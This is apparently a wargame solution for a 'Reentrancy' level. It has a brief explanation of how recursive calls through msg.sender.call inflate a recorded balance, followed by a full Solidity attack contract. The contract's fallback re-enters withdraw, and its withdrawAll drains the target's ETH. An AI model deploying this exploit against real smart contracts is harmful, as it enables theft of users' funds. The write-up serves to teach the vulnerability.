#Reentrancy

The weakpoint of this smart contract lies within the msg.sender.call where it calls either the
sender's receive or payable fallback function. We can first donate some amount of ETH in order to
get our balance above 0. Then we recursively withdraw the value that we donated thereby increasing
our balances to the integer max. Since we now have a balance greater than that of what we actually
donated, we can withdraw to take the remaining balance left in the contract.

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IReentrance{
    function donate(address) external payable;
    function balanceOf(address) external view returns(uint);
    function withdraw(uint) external;
}

contract ReentrancyAttack {
    address payable immutable i_targetAddress;
    uint private attackerValue;
    constructor(address payable _targetAddress) {
        i_targetAddress = _targetAddress;
    }
    function addFunds() public payable{
        attackerValue = msg.value;
        IReentrance(i_targetAddress).donate{value: msg.value}(address(this));
    }

    function getBalance(address _addr) public view returns(uint) {
        return IReentrance(i_targetAddress).balanceOf(_addr);
    }
    function attack() public {
        IReentrance(i_targetAddress).withdraw(attackerValue);
    }
    function withdrawAll() public {
        IReentrance(i_targetAddress).withdraw((i_targetAddress).balance);
    }
    //receive() external payable{}
    fallback () external payable {
        if(msg.value == attackerValue) {
            IReentrance(i_targetAddress).withdraw(attackerValue);
        }
    }
}

```
